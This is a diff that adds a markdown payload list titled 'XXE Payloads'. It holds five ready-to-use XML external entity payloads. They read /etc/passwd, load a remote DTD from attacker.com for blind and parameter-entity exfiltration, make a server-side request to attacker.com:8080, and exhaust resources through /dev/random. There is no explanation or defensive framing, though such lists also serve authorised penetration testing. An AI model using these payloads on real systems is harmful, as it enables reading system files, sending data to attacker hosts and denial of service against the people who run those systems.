@@ -1,0 +1,35 @@
+# XXE Payloads
+
+## Basic XXE
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<data>&xxe;</data>
+
+## Blind XXE
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+%xxe;
+]>
+
+## Parameter Entities
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
+%dtd;
+]>
+
+## SSRF via XXE
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "http://attacker.com:8080/secret">
+]>
+
+## DoS Payloads
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY xxe SYSTEM "file:///dev/random">
+]>
